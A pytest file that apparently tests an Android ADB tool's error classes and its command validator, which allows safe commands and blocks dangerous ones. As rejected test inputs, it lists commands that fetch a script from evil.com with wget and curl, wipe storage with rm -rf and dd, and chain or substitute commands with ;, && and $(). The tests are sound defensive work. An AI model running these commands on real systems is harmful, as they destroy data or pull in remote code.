"""
Tests for main.py utility functions: _validate_adb_command and error hierarchy.
"""

import pytest
import sys
import os

sys.path.insert(0, os.path.dirname(__file__))

from main import (
    _validate_adb_command,
    AppError,
    DeviceNotFoundError,
    HierarchyNotFoundError,
    CommandExecutionError,
    ScreenshotError,
)


# --- Error Hierarchy Tests ---

class TestAppErrorHierarchy:
    def test_app_error_is_exception(self):
        # AppError base requires code/status_code — only subclasses are directly instantiable
        err = DeviceNotFoundError("test")
        assert isinstance(err, Exception)
        assert isinstance(err, AppError)

    def test_device_not_found_is_app_error(self):
        err = DeviceNotFoundError("device not found")
        assert isinstance(err, AppError)
        assert isinstance(err, Exception)

    def test_hierarchy_not_found_is_app_error(self):
        err = HierarchyNotFoundError("hierarchy not found")
        assert isinstance(err, AppError)

    def test_command_execution_error_is_app_error(self):
        err = CommandExecutionError("command failed")
        assert isinstance(err, AppError)

    def test_screenshot_error_is_app_error(self):
        err = ScreenshotError("screenshot failed")
        assert isinstance(err, AppError)

    def test_error_messages_preserved(self):
        msg = "Something went wrong"
        err = DeviceNotFoundError(msg)
        assert str(err) == msg

    def test_device_not_found_default_message(self):
        err = DeviceNotFoundError()
        assert "device" in str(err).lower()


# --- _validate_adb_command Tests ---

class TestValidateAdbCommand:
    """ADB command validation: allow safe commands, block dangerous ones."""

    def test_empty_command_rejected(self):
        ok, reason = _validate_adb_command("")
        assert not ok

    def test_none_command_rejected(self):
        ok, reason = _validate_adb_command(None)
        assert not ok

    def test_command_too_long_rejected(self):
        long_cmd = "a" * 501
        ok, reason = _validate_adb_command(long_cmd)
        assert not ok
        assert "500" in reason

    # --- Allowed commands ---

    def test_input_text_allowed(self):
        ok, reason = _validate_adb_command("input text hello")
        assert ok

    def test_input_keyevent_allowed(self):
        ok, reason = _validate_adb_command("input keyevent 26")
        assert ok

    def test_pm_list_allowed(self):
        ok, reason = _validate_adb_command("pm list packages")
        assert ok

    def test_pm_install_allowed(self):
        ok, reason = _validate_adb_command("pm install /data/app/foo.apk")
        assert ok

    def test_am_start_allowed(self):
        ok, reason = _validate_adb_command("am start -n com.example/.MainActivity")
        assert ok

    def test_screencap_allowed(self):
        ok, reason = _validate_adb_command("screencap -p")
        assert ok

    def test_screenrecord_allowed(self):
        ok, reason = _validate_adb_command("screenrecord /sdcard/demo.mp4")
        assert ok

    def test_getprop_allowed(self):
        ok, reason = _validate_adb_command("getprop ro.build.version.sdk")
        assert ok

    def test_dumpsys_allowed(self):
        ok, reason = _validate_adb_command("dumpsys activity")
        assert ok

    def test_settings_get_allowed(self):
        ok, reason = _validate_adb_command("settings get secure user_setup_complete")
        assert ok

    def test_monkey_allowed(self):
        ok, reason = _validate_adb_command("monkey -p com.example -c android.intent.category.LAUNCHER 1")
        assert ok

    def test_ls_short_command_allowed(self):
        ok, reason = _validate_adb_command("ls")
        assert ok

    def test_ps_short_command_allowed(self):
        ok, reason = _validate_adb_command("ps")
        assert ok

    def test_cat_short_command_allowed(self):
        ok, reason = _validate_adb_command("cat /data/local/tmp/foo.txt")
        assert ok

    # --- Blocked dangerous commands ---

    def test_reboot_blocked(self):
        ok, reason = _validate_adb_command("reboot")
        assert not ok
        assert "reboot" in reason.lower()

    def test_su_reboot_blocked(self):
        ok, reason = _validate_adb_command("su root reboot")
        assert not ok

    def test_dd_blocked(self):
        ok, reason = _validate_adb_command("dd if=/dev/zero of=/dev/sda")
        assert not ok

    def test_rm_rf_blocked(self):
        ok, reason = _validate_adb_command("rm -rf /")
        assert not ok

    def test_wget_blocked(self):
        ok, reason = _validate_adb_command("wget http://evil.com/shell.sh")
        assert not ok

    def test_curl_blocked(self):
        ok, reason = _validate_adb_command("curl http://evil.com/shell.sh")
        assert not ok

    def test_android_shell_blocked(self):
        ok, reason = _validate_adb_command("sh")
        assert not ok

    # --- Blocked dangerous characters ---

    def test_pipe_character_blocked(self):
        ok, reason = _validate_adb_command("cat /etc/passwd | ls")
        assert not ok

    def test_semicolon_blocked(self):
        ok, reason = _validate_adb_command("ls; rm -rf /")
        assert not ok

    def test_double_ampersand_blocked(self):
        ok, reason = _validate_adb_command("ls && rm -rf /")
        assert not ok

    def test_backtick_blocked(self):
        ok, reason = _validate_adb_command("echo `whoami`")
        assert not ok

    def test_command_substitution_blocked(self):
        ok, reason = _validate_adb_command("echo $(whoami)")
        assert not ok

    def test_output_redirect_blocked(self):
        ok, reason = _validate_adb_command("echo hello > /data/local/tmp/out.txt")
        assert not ok

    def test_append_redirect_blocked(self):
        ok, reason = _validate_adb_command("echo hello >> /data/local/tmp/out.txt")
        assert not ok

    def test_input_redirect_blocked(self):
        ok, reason = _validate_adb_command("cat < /data/local/tmp/in.txt")
        assert not ok

    # --- Case sensitivity ---

    def test_uppercase_command_blocked(self):
        ok, reason = _validate_adb_command("REBOOT")
        assert not ok

    # --- Whitespace handling ---

    def test_command_with_extra_whitespace(self):
        ok, reason = _validate_adb_command("  screencap   -p  ")
        assert ok

    def test_command_case_insensitive(self):
        ok, reason = _validate_adb_command("INPUT TEXT hello")
        assert ok
